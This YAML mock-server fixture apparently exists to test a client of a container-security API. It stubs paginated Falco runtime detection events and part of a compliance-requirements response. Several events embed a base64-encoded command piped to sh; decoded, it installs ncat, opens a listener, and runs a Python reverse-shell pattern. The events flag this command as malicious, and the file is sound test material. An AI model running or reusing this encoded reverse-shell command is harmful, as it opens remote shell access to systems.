rules:
  - path: /secure/events/v1/events
    methods: ['GET']
    query_params:
      from: "{from:.*}"
      to: "{to:.*}"
      cursor: null
      limit: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
            "data": [
              {
                "category": "runtime",
                "content": {
                  "fields": {
                    "container.image.repository": "docker.io/library/python",
                    "container.name": "shell-scripting",
                    "evt.res": "SUCCESS",
                    "evt.type": "execve",
                    "group.gid": "0",
                    "group.name": "root",
                    "proc.args": "",
                    "proc.cmdline": "sh",
                    "proc.cwd": "/",
                    "proc.exepath": "/usr/bin/dash",
                    "proc.hash.sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
                    "proc.name": "sh",
                    "proc.pcmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "proc.pid": "1890726",
                    "proc.pid.ts": "1744002001003626585",
                    "proc.pname": "bash",
                    "proc.ppid": "1890704",
                    "proc.ppid.ts": "1744002000895807711",
                    "proc.sid": "1",
                    "user.loginname": "<NA>",
                    "user.loginuid": "-1",
                    "user.name": "root",
                    "user.uid": "0"
                  },
                  "origin": "Secure UI",
                  "output": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1890726 proc.cwd=/ proc.ppid=1890704 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744002001003626585 proc.ppid.ts=1744002000895807711 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
                  "policyId": 10569534,
                  "ruleName": "My test rule custom",
                  "ruleSubType": 0,
                  "ruleTags": [
                    "My-tag-custom-1-hello-world",
                    "MITTRE-WHATEVER"
                  ],
                  "ruleType": 6,
                  "type": "workloadRuntimeDetection"
                },
                "description": "This is just a dumb policy to test custom policies",
                "engine": "falco",
                "id": "1a33f0946dabcdefabcdefad5c3e7f22",
                "labels": {
                  "cloudProvider.account.id": "123456789012",
                  "cloudProvider.name": "gcp",
                  "cloudProvider.region": "us-central1",
                  "container.image.digest": "sha256:aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a",
                  "container.image.id": "ef0abcdefbd2",
                  "container.image.repo": "docker.io/library/python",
                  "container.image.tag": "3.9.18-slim",
                  "container.label.io.kubernetes.container.name": "shell-scripting",
                  "container.label.io.kubernetes.pod.name": "shell-scripting-abcdef12-12345",
                  "container.label.io.kubernetes.pod.namespace": "default",
                  "container.name": "shell-scripting",
                  "gcp.location": "us-central1",
                  "gcp.projectId": "1231456789012",
                  "host.hostName": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                  "host.mac": "01:00:5e:90:10:00",
                  "kubernetes.cluster.name": "gke-alliances-demo-6",
                  "kubernetes.cronJob.name": "shell-scripting",
                  "kubernetes.job.name": "shell-scripting-29066700",
                  "kubernetes.namespace.name": "default",
                  "kubernetes.node.name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                  "kubernetes.pod.name": "shell-scripting-abcdef12-12345",
                  "kubernetes.workload.name": "shell-scripting",
                  "kubernetes.workload.type": "cronjob"
                },
                "name": "Manuel test policy",
                "originator": "policy",
                "rawEventCategory": "runtime",
                "rawEventOriginator": "linuxAgent",
                "severity": 4,
                "source": "syscall",
                "sourceDetails": {
                  "subType": "container",
                  "type": "workload"
                },
                "timestamp": 1744772461195149800
              },
              {
                "category": "runtime",
                "content": {
                  "fields": {
                    "container.image.repository": "docker.io/library/python",
                    "container.name": "shell-scripting",
                    "evt.res": "SUCCESS",
                    "evt.type": "execve",
                    "group.gid": "0",
                    "group.name": "root",
                    "proc.args": "",
                    "proc.cmdline": "sh",
                    "proc.cwd": "/",
                    "proc.exepath": "/usr/bin/dash",
                    "proc.hash.sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
                    "proc.name": "sh",
                    "proc.pcmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "proc.pid": "1372469",
                    "proc.pid.ts": "1743822001115100312",
                    "proc.pname": "bash",
                    "proc.ppid": "1372453",
                    "proc.ppid.ts": "1743822000952432134",
                    "proc.sid": "1",
                    "user.loginname": "<NA>",
                    "user.loginuid": "-1",
                    "user.name": "root",
                    "user.uid": "0"
                  },
                  "origin": "Secure UI",
                  "output": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
                  "policyId": 10569534,
                  "ruleName": "My test rule custom",
                  "ruleSubType": 0,
                  "ruleTags": [
                    "My-tag-custom-1-hello-world",
                    "MITTRE-WHATEVER"
                  ],
                  "ruleType": 6,
                  "type": "workloadRuntimeDetection"
                },
                "description": "This is just a dumb policy to test custom policies",
                "engine": "falco",
                "id": "1a334cdef0060123456789abcdef64a9",
                "labels": {
                  "cloudProvider.account.id": "012345678912",
                  "cloudProvider.name": "gcp",
                  "cloudProvider.region": "us-central1",
                  "container.image.digest": "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a",
                  "container.image.id": "ef0f72a55bd2",
                  "container.image.repo": "docker.io/library/python",
                  "container.image.tag": "3.9.18-slim",
                  "container.label.io.kubernetes.container.name": "shell-scripting",
                  "container.label.io.kubernetes.pod.name": "shell-scripting-29063700-123ab",
                  "container.label.io.kubernetes.pod.namespace": "default",
                  "container.name": "shell-scripting",
                  "gcp.location": "us-central1",
                  "gcp.projectId": "012345678912",
                  "host.hostName": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                  "host.mac": "01:00:5e:90:10:00",
                  "kubernetes.cluster.name": "gke-alliances-demo-6",
                  "kubernetes.cronJob.name": "shell-scripting",
                  "kubernetes.job.name": "shell-scripting-29063700",
                  "kubernetes.namespace.name": "default",
                  "kubernetes.node.name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd",
                  "kubernetes.pod.name": "shell-scripting-12345678-123ab",
                  "kubernetes.workload.name": "shell-scripting",
                  "kubernetes.workload.type": "cronjob"
                },
                "name": "Manuel test policy",
                "originator": "policy",
                "rawEventCategory": "runtime",
                "rawEventOriginator": "linuxAgent",
                "severity": 4,
                "source": "syscall",
                "sourceDetails": {
                  "subType": "container",
                  "type": "workload"
                },
                "timestamp": 1743822001115928600
              }
            ],
            "page": {
              "next": "abcdefgabcdefg01234567899876543210==",
              "total": 5
            }
          }
          `}}
  - path: /secure/events/v1/events
    methods: ['GET']
    query_params:
      from: null
      to: null
      cursor: abcdefgabcdefg01234567899876543210==
      limit: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
            "data": [
              {
                "actions": [
                  {
                    "afterEventNs": 30000000000,
                    "beforeEventNs": 15000000000,
                    "errMsg": "maximum number of outstanding captures (1) reached",
                    "isSuccessful": false,
                    "token": "7d30b372-3dd9-1234-5678-403612345678",
                    "type": "capture"
                  }
                ],
                "category": "runtime",
                "content": {
                  "fields": {
                    "container.id": "382abcdefd0a",
                    "container.image.repository": "gcr.io/cadvisor/cadvisor",
                    "container.image.tag": "v0.45.0",
                    "container.mounts": "/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private",
                    "container.name": "cadvisor",
                    "evt.res": "SUCCESS",
                    "evt.type": "execve",
                    "group.gid": "0",
                    "group.name": "root",
                    "proc.cmdline": "cadvisor -logtostderr --enable_metrics=cpu,diskIO,memory,network,oom_event --docker_only",
                    "proc.cwd": "/",
                    "proc.exepath": "/usr/bin/cadvisor",
                    "proc.name": "cadvisor",
                    "proc.pcmdline": "runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a",
                    "proc.pid": "741051",
                    "proc.pname": "runc",
                    "proc.ppid": "741043",
                    "proc.sid": "1",
                    "user.loginname": "<NA>",
                    "user.loginuid": "-1",
                    "user.name": "root",
                    "user.uid": "0"
                  },
                  "origin": "Sysdig",
                  "output": "Container cadvisor having image gcr.io/cadvisor/cadvisor with sensitive mount started by user root  and parent runc (proc.name=cadvisor image=gcr.io/cadvisor/cadvisor:v0.45.0 proc.exepath=/usr/bin/cadvisor proc.pname=runc gparent=containerd-shim ggparent=systemd gggparent=<NA> mounts=/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private evt.type=execve evt.res=SUCCESS proc.pid=741051 proc.cwd=/ proc.ppid=741043 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a proc.sid=1 user.loginuid=-1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.id=382e35271d0a container.name=cadvisor)",
                  "policyId": 10011701,
                  "ruleName": "Launch Sensitive Mount Container",
                  "ruleSubType": 0,
                  "ruleTags": [
                    "container",
                    "container_best_practices",
                    "container_immutability",
                    "SOC2",
                    "SOC2_CC6.1",
                    "NIST",
                    "NIST_800-190",
                    "NIST_800-190_3.4.3",
                    "NIST_800-190_3.5.5",
                    "NIST_800-53",
                    "NIST_800-53_AC-6(9)",
                    "NIST_800-53_AC-6(10)",
                    "NIST_800-53_AU-6(8)",
                    "ISO",
                    "ISO_27001",
                    "ISO_27001_A.9.2.3",
                    "HIPAA",
                    "HIPAA_164.308(a)",
                    "HIPAA_164.312(a)",
                    "HIPAA_164.312(b)",
                    "HITRUST",
                    "HITRUST_CSF",
                    "HITRUST_CSF_01.c",
                    "HITRUST_CSF_09.aa",
                    "GDPR",
                    "GDPR_32.1",
                    "GDPR_32.2",
                    "MITRE",
                    "MITRE_T1609_container_administration_command",
                    "MITRE_T1611_escape_to_host",
                    "MITRE_TA0002_execution",
                    "MITRE_TA0004_privilege_escalation",
                    "MITRE_TA0008_lateral_movement",
                    "MITRE_T1610_deploy_container",
                    "MITRE_TA0005_defense_evasion",
                    "MITRE_T1055.009_process_injection_proc_memory",
                    "MITRE_T1543_create_or_modify_system_process",
                    "CIS",
                    "oss"
                  ],
                  "ruleType": 6,
                  "type": "workloadRuntimeDetection"
                },
                "description": "This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.",
                "engine": "falco",
                "id": "1836ac8550123456789abcdefe5d827f",
                "labels": {
                  "container.image.digest": "sha256:9360d7421c5e9b646ea13e5ced3f8e6da80017b0144733a04b7401dd8c01a5cb",
                  "container.image.id": "3f3e5f568a6d",
                  "container.image.repo": "gcr.io/cadvisor/cadvisor",
                  "container.image.tag": "v0.45.0",
                  "container.label.io.kubernetes.container.name": "cadvisor",
                  "container.label.io.kubernetes.pod.name": "wave-autoscale-agent-abcde",
                  "container.label.io.kubernetes.pod.namespace": "wave-autoscale",
                  "container.name": "cadvisor",
                  "host.hostName": "hybrid-node",
                  "host.mac": "01:00:5e:90:10:02",
                  "kubernetes.cluster.name": "myclusterName",
                  "kubernetes.namespace.name": "wave-autoscale",
                  "kubernetes.node.name": "node04",
                  "kubernetes.pod.name": "wave-autoscale-agent-abcde"
                },
                "name": "Sysdig Runtime Notable Events",
                "originator": "policy",
                "rawEventCategory": "runtime",
                "rawEventOriginator": "linuxAgent",
                "severity": 5,
                "source": "syscall",
                "sourceDetails": {
                  "subType": "container",
                  "type": "workload"
                },
                "timestamp": 1744701225528350000
              },
              {
                "category": "runtime",
                "content": {
                  "fields": {
                    "container.id": "4db57cd1354c",
                    "container.name": "shell-scripting",
                    "group.gid": "0",
                    "group.name": "root",
                    "proc.cmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "proc.cwd": "/",
                    "proc.exepath": "/usr/bin/bash",
                    "proc.hash.sha256": "7ebfc53f17925af4340d4218aafd16ba39b5afa8b6ac1f7adc3dd92952a2a237",
                    "proc.name": "bash",
                    "proc.pcmdline": "runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe",
                    "proc.pid": "97888",
                    "proc.pname": "runc",
                    "proc.ppid": "97881",
                    "proc.sid": "1",
                    "user.loginname": "<NA>",
                    "user.loginuid": "-1",
                    "user.name": "root",
                    "user.uid": "0"
                  },
                  "origin": "Sysdig",
                  "output": "Potentially malicious Shell script base64-encoded under user root on shell-scripting (proc.name=bash proc.exepath=/usr/bin/bash proc.pname=runc gparent=containerd-shim ggparent=containerd-shim gggparent=containerd proc.cmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root proc.pid=97888 proc.cwd=/ proc.ppid=97881 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe/init.pid 4db57cd1354c54c52c52af44b6e872f23e1d70428602efe1b0b0dc39ec53e3fe proc.sid=1 user.uid=0 user.loginuid=-1 user.loginname=<NA> group.gid=0 group.name=root container.id=4db57cd1354c container.name=shell-scripting)",
                  "policyId": 10011698,
                  "ruleName": "Base64-encoded Shell Script Execution",
                  "ruleSubType": 0,
                  "ruleTags": [
                    "host",
                    "container",
                    "MITRE",
                    "MITRE_T1132.001_data_encoding_standard_encoding",
                    "MITRE_TA0011_command_and_control",
                    "MITRE_TA0005_defense_evasion",
                    "MITRE_T1059.004_command_and_scripting_interpreter_unix_shell",
                    "MITRE_T1059_command_and_scripting_interpreter",
                    "MITRE_TA0002_execution",
                    "MITRE_T1027_obfuscated_files_and_information",
                    "MITRE_T1140_deobfuscate_decode_files_or_information"
                  ],
                  "ruleType": 6,
                  "type": "workloadRuntimeDetection"
                },
                "description": "This policy contains rules which Sysdig considers High Confidence of a security incident. They are tightly coupled to common attacker TTP's. They have been designed to minimize false positives but may still result in some depending on your environment.",
                "engine": "falco",
                "id": "183a5e0123456789zbcdef400ba6d116",
                "labels": {
                  "cloudProvider.account.id": "012345678912",
                  "cloudProvider.name": "gcp",
                  "cloudProvider.region": "us-central1",
                  "container.image.digest": "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a",
                  "container.image.id": "ef0f72a55bd2",
                  "container.image.repo": "docker.io/library/python",
                  "container.image.tag": "3.9.18-slim",
                  "container.label.io.kubernetes.container.name": "shell-scripting",
                  "container.label.io.kubernetes.pod.name": "shell-scripting-1234567-12345",
                  "container.label.io.kubernetes.pod.namespace": "default",
                  "container.name": "shell-scripting",
                  "gcp.location": "us-central1",
                  "gcp.projectId": "012345678912",
                  "host.hostName": "gke-cluster-gcp-demo-san-default-pool-12345678-1234",
                  "host.mac": "01:00:5e:90:10:00",
                  "kubernetes.cluster.name": "gke-alliances-demo-6",
                  "kubernetes.cronJob.name": "shell-scripting",
                  "kubernetes.job.name": "shell-scripting-29082780",
                  "kubernetes.namespace.name": "default",
                  "kubernetes.node.name": "gke-cluster-gcp-demo-san-default-pool-12345678-1234",
                  "kubernetes.pod.name": "shell-scripting-00123450-abcd5",
                  "kubernetes.workload.name": "shell-scripting",
                  "kubernetes.workload.type": "cronjob"
                },
                "name": "Sysdig Runtime Threat Detection",
                "originator": "policy",
                "rawEventCategory": "runtime",
                "rawEventOriginator": "linuxAgent",
                "severity": 3,
                "source": "syscall",
                "sourceDetails": {
                  "subType": "container",
                  "type": "workload"
                },
                "timestamp": 1744966800841090300
              }
            ],
            "page": {
              "next": "01234567899876543210abcdefgabcdefg==",
              "total": 5
            }
          }
          `}}
  - path: /secure/events/v1/events
    methods: ['GET']
    query_params:
      from: null
      to: null
      cursor: 01234567899876543210abcdefgabcdefg==
      limit: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
            "data": [
              {
                "category": "runtime",
                "content": {
                  "fields": {
                    "container.image.repository": "docker.io/library/python",
                    "container.name": "shell-scripting",
                    "evt.res": "SUCCESS",
                    "evt.type": "execve",
                    "group.gid": "0",
                    "group.name": "root",
                    "proc.args": "",
                    "proc.cmdline": "sh",
                    "proc.cwd": "/",
                    "proc.exepath": "/usr/bin/dash",
                    "proc.hash.sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
                    "proc.name": "sh",
                    "proc.pcmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "proc.pid": "4094247",
                    "proc.pid.ts": "1744772461104588229",
                    "proc.pname": "bash",
                    "proc.ppid": "4093769",
                    "proc.ppid.ts": "1744772400850031947",
                    "proc.sid": "1",
                    "user.loginname": "<NA>",
                    "user.loginuid": "-1",
                    "user.name": "root",
                    "user.uid": "0"
                  },
                  "origin": "Secure UI",
                  "output": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=4094247 proc.cwd=/ proc.ppid=4093769 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744772461104588229 proc.ppid.ts=1744772400850031947 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
                  "policyId": 10569534,
                  "ruleName": "My test rule custom",
                  "ruleSubType": 0,
                  "ruleTags": [
                    "My-tag-custom-1-hello-world",
                    "MITTRE-WHATEVER"
                  ],
                  "ruleType": 6,
                  "type": "workloadRuntimeDetection"
                },
                "description": "This is just a dumb policy to test custom policies",
                "engine": "falco",
                "id": "1a36a012345678998765432108f1e03e",
                "labels": {
                  "cloudProvider.account.id": "012345678912",
                  "cloudProvider.name": "gcp",
                  "cloudProvider.region": "us-central1",
                  "container.image.digest": "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a",
                  "container.image.id": "ef0f72a55bd2",
                  "container.image.repo": "docker.io/library/python",
                  "container.image.tag": "3.9.18-slim",
                  "container.label.io.kubernetes.container.name": "shell-scripting",
                  "container.label.io.kubernetes.pod.name": "shell-scripting-29079540-cqf5n",
                  "container.label.io.kubernetes.pod.namespace": "default",
                  "container.name": "shell-scripting",
                  "gcp.location": "us-central1",
                  "gcp.projectId": "012345678912",
                  "host.hostName": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd",
                  "host.mac": "01:00:5e:90:10:00",
                  "kubernetes.cluster.name": "gke-alliances-demo-6",
                  "kubernetes.cronJob.name": "shell-scripting",
                  "kubernetes.job.name": "shell-scripting-29079540",
                  "kubernetes.namespace.name": "default",
                  "kubernetes.node.name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd",
                  "kubernetes.pod.name": "shell-scripting-12345678-abcde",
                  "kubernetes.workload.name": "shell-scripting",
                  "kubernetes.workload.type": "cronjob"
                },
                "name": "Manuel test policy",
                "originator": "policy",
                "rawEventCategory": "runtime",
                "rawEventOriginator": "linuxAgent",
                "severity": 4,
                "source": "syscall",
                "sourceDetails": {
                  "subType": "container",
                  "type": "workload"
                },
                "timestamp": 1744772461195149800
              }
            ],
            "page": {
              "total": 5
            }
          }
          `}}
  - path: /api/cspm/v1/compliance/requirements
    methods: ['GET']
    query_params:
      pageNumber: 1
      pageSize: 2
    request_headers:
      Authorization:
        - "Bearer xxxx"
    responses:
      - status_code: 200
        headers:
          Content-Type:
            - 'application/json'
        body: |-
          {{ minify_json `
          {
              "data": [
                  {
                      "name": "AWS Controls",
                      "pass": false,
                      "severity": "High",
                      "policyId": "52",
                      "policyName": "All Posture Findings",
                      "controls": [
                          {
                              "id": "21344",
                              "name": "Lambda - Enable Encryption at Rest for Environment Variables using Customer Master Keys",
                              "description": "Ensure that your Amazon Lambda environment variables are using customer-managed Customer Master Keys (CMKs) instead of AWS managed-keys (i.e. default keys used when there are no customer keys defined) in order to benefit from a more granular control over the data encryption and decryption process. The environment variables defined for your Amazon Lambda functions are key-value pairs that are used to store configuration settings without the need to change function code.",
                              "target": "AWS",
                              "type": 8,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 2879,
                              "remediationId": "21344",
                              "lastUpdate": "1752149383",
                              "acceptedCount": 0,
                              "resourceKind": "AWS_LAMBDA_FUNCTION",
                              "isManual": false,
                              "resourceApiEndpoint": "/api/cspm/v1/cloud/resources?controlId=21344&providerType=AWS&resourceKind=AWS_LAMBDA_FUNCTION&filter=policyId=52 and zones.id=119",
                              "supportedDistributions": [
                                  {
                                      "name": "AWS",
                                      "minVersion": 0,
                                      "maxVersion": 0
                                  }
                              ],
                              "platform": "",
                              "authors": "Sysdig",
                              "passingCount": 0
                          },
                          {
                              "id": "21447",
                              "name": "CloudFormation - Stack Policy",
                              "description": "Ensure CloudFormation stack policies are set to prevent accidental updates to stack resources.",
                              "target": "AWS",
                              "type": 8,
                              "pass": false,
                              "severity": "High",
                              "objectsCount": 40,
                              "remediationId": "21447",
                              "lastUpdate": "1752149383",
                              "acceptedCount": 0,
                              "resourceKind": "AWS_CLOUDFORMATION_STACK",
                              "isManual": false,
